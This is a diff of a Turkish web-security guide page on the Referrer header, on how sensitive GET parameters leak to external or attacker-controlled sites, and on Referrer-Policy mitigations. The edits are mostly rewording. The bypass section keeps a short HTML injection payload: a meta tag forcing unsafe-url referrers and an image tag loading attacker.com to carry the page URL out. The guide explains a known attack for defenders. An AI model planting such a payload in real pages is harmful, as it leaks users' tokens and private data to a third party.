@@ -2,11 +2,11 @@
 
 # Referrer başlıkları ve politikası
 
-Referrer, tarayıcıların hangi sayfanın önceki ziyaret edildiğini belirtmek için kullandığı başlıktır.
+Referrer, tarayıcılar tarafından önceki ziyaret edilen sayfayı belirtmek için kullanılan başlıktır.
 
 ## Hassas bilgilerin sızdırılması
 
-Eğer bir web sayfası içinde herhangi bir hassas bilgi GET isteği parametrelerinde yer alıyorsa, eğer sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak için (sosyal mühendislik) bir öneride bulunabiliyorsa, en son GET isteği içindeki hassas bilgileri dışarıya sızdırabilir.
+Eğer bir web sayfasında herhangi bir noktada hassas bilgiler GET isteği parametrelerinde yer alıyorsa, eğer sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak için (sosyal mühendislik) bir şekilde yönlendirebiliyorsa, en son GET isteğindeki hassas bilgileri dışarı sızdırabilir.
 
 ## Azaltma
 
@@ -23,8 +23,8 @@ Referrer-Policy: unsafe-url
 ```
 ## Karşı Önlem
 
-Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu kullanması gerekir):
-```markup
+Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu gerçekleştirmesi gerekir):
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
